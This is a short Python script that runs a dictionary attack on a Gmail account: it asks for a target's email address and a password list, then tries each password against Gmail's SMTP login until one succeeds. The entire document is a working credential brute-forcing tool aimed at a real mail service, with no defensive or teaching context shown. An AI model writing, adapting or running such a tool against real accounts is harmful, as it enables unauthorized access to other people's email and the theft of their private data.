import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()


user = input("[*] Enter targets email adress: ")
passwdfile = input("[*] Enter the path to the password file: ")
print("\n")
file = open (passwdfile, 'r')

for password in file:
    password = password.strip('\n')

    try:
        smtpserver.login(user, password)
        print("[+] password found: %s" % password)
        break
    except smtplib.SMTPAuthenticationError:
        print("[-] wrong password: " + password)

input()
